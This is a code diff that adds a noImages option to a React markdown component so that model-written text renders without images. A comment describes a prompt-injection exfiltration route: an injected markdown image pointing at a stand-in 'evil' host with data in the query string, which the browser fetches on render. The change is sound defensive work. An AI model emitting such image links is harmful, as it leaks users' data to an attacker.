@@ -54,10 +54,14 @@ const components = {
   td: (props: React.ComponentProps<"td">) => <td className="border-b px-2 py-1" {...props} />,
 };
 
-export function MarkdownContent({ body }: { body: string }) {
+/**
+ * `noImages` is for model-written text: an injected "![x](https://evil/?d=...)" would make the browser
+ * fetch that URL on render and leak whatever the model put in it. Wiki pages keep their images.
+ */
+export function MarkdownContent({ body, noImages = false }: { body: string; noImages?: boolean }) {
   return (
     <div className="text-sm text-foreground/90">
-      <Markdown remarkPlugins={[remarkGfm]} components={components}>
+      <Markdown remarkPlugins={[remarkGfm]} components={components} disallowedElements={noImages ? ["img"] : undefined}>
         {body}
       </Markdown>
     </div>
